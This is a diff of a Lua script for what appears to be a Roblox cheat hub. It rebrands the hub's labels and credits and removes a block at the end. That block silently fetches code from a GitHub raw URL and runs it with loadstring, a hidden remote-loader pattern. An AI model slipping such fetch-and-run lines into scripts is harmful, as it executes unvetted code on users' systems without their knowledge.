@@ -12,7 +12,7 @@ MakeWindow({
     Key = {
     KeySystem = true,
     Title = "Key System",
-    Description = "Wolfpaq",
+    Description = "MATRIX KEY SYSTEM",
     KeyLink = "Wolfpaq",
     Keys = {"adm"},
     Notifi = {
@@ -82,15 +82,15 @@ end
 coroutine.wrap(updateTime)(Label)
 
 local Label = AddTextLabel(Main,
-{"Welcome To Shnmaxhub"})
+{"Welcome To Matrix"})
 local Label = AddTextLabel(Main,
-{"Team | Shnmaxscripts"})
+{"Team | Matrix"})
 local Label = AddTextLabel(Main,
-{"Script Development Helpers: XXXTENTACION The Lucca"})
+{"Script Development Helpers: "})
 local Label = AddTextLabel(Main,
-{"Last Update to Hub: 19/Day/2024/Year/Jun/Month"})
+{"Last Update to Hub: 19/Day/2024/Year/Sla/Month"})
 local Label = AddTextLabel(Main,
-{"Code Developed By: Shnmaxscripts Owner"})
+{"Code Developed By: Not Legitty"})
 local Label = AddTextLabel(Main,
 {"Use Responsibly"})
 local Label = AddTextLabel(Main,
@@ -2647,7 +2647,7 @@ local Toggle = AddToggle(CmdsTab, {
 local Looping = false
 
 local Toggle = AddToggle(CmdsTab, {
-  Name = "Nome SHNMAX",
+  Name = "Nome Sla",
   Default = false,
   Callback = function(Value)
     Looping = Value
@@ -2704,12 +2704,5 @@ local Toggle = AddToggle(CmdsTab, {
   end
 })
 
--- Função para executar automaticamente o código fornecido
-local function AutoExecute()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/Xtentacion178/Iys/main/Dbbd"))()
-end
-
--- Chama a função para executar automaticamente o código
-AutoExecute()
 
 -- End Script
